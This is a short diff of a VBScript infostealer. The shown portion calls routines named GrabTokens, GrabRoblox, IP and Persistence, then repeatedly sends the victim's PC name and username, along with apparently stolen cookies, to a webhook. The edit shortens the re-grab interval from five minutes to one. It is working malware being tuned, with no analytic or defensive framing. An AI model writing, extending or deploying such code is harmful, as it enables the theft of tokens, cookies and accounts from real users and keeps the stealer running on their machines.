@@ -24,14 +24,14 @@ Call IP(True)
 Call GrabRoblox(True)
 Call Persistence(True)
 
-' --- Re-run grab chain 4x (every 5 min) (Cookies Only to RE_WH) ---
+' --- Re-run grab chain 4x (every 1 min) (Cookies Only to RE_WH) ---
 Dim runCount
 For runCount = 1 To 4
     Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
     Call GrabTokens(False)
     Call IP(False)
     Call GrabRoblox(False)
-    If runCount < 4 Then Call SleepMinutes(5)
+    If runCount < 4 Then Call SleepMinutes(1)
 Next
 
 ' --- WAIT AND CLOSE ---
